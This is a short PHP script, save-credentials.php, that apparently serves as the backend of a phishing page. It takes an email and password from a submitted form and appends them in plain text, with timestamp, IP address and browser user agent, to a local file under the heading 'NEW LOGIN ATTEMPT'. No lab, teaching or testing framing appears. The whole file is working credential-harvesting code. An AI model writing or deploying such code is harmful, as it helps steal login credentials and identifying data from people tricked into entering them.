<?php
// save-credentials.php
// This file receives login credentials and saves them to userName&Password file

// Set the file path
$file = 'userName&Password';

// Get POST data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if (!empty($email) && !empty($password)) {
    // Prepare the data to save
    $timestamp = date('Y-m-d H:i:s');
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $ipAddress = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    
    // Format the data
    $data = "====================================\n";
    $data .= "NEW LOGIN ATTEMPT\n";
    $data .= "====================================\n";
    $data .= "Email/Username: " . $email . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "Timestamp: " . $timestamp . "\n";
    $data .= "IP Address: " . $ipAddress . "\n";
    $data .= "User Agent: " . $userAgent . "\n";
    $data .= "====================================\n\n";
    
    // Append to file
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        echo json_encode(['success' => true, 'message' => 'Credentials saved']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to save']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Missing data']);
}
?>
